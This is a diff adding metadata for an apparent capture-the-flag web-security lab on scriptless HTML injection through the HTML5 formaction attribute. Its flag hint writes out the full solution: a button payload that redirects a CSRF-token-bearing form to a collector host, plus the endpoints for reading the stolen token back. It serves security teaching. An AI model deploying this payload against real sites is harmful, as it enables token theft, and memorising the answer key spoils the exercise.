@@ -1,0 +1,47 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "formaction-xss-button-injection",
+  "title": "HTML5 formaction Attribute Injection",
+  "track": "xss",
+  "difficulty": "practitioner",
+  "estimated_minutes": 35,
+  "max_lifetime_minutes": 60,
+  "learning_objectives": [
+    "Understand a scriptless HTML-injection attack: not every XSS-class bug runs JavaScript — a permitted attribute alone can subvert the page",
+    "Exploit the HTML5 formaction/formmethod override: a <button> inside a form can change where that form submits, redirecting it to an attacker origin",
+    "Recognise how allow-list sanitisers fail on attribute SEMANTICS: nh3/DOMPurify correctly strip scripts and handlers, yet permitting formaction on a CTA button hands over the form's target",
+    "Exfiltrate a secret that is NOT a cookie — a hidden CSRF token in the form body — by hijacking the form's submit target, which no output encoding of the token would prevent",
+    "See why HttpOnly and 'no inline scripts' do not help here: there is no document.cookie read and no script at all, so cookie flags and script-src CSP are irrelevant to this vector"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["stored-xss-svg-avatar-upload", "markdown-renderer-javascript-uri-bypass"],
+  "flag_hint": "POST /blocks a draft containing <button type=\"submit\" formaction=\"http://collector:9000/report\" formmethod=\"post\">Approve draft</button>. The editor bot reviews the draft on /admin/review (which renders it inside the CSRF-token-bearing approve form) and clicks the CTA button; formaction redirects the form POST to the collector with the token. Read it via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "nh3 0.2 allow-list sanitiser (permits <button formaction>) — the flaw",
+    "@websec-lab/xss-verifier headless-Chromium bot (click delivery)",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "html-injection",
+    "scriptless",
+    "formaction",
+    "form-hijacking",
+    "sanitiser-bypass",
+    "allowlist-gap",
+    "csrf-token-theft",
+    "click-delivery",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "Michał Bentkowski / Cure53 formaction research and the DOMPurify permissive-config examples, abstracted for local Docker with a Flask CMS, an nh3 allow-list sanitiser, a Playwright editor bot that clicks review buttons, and an OOB collector"
+}
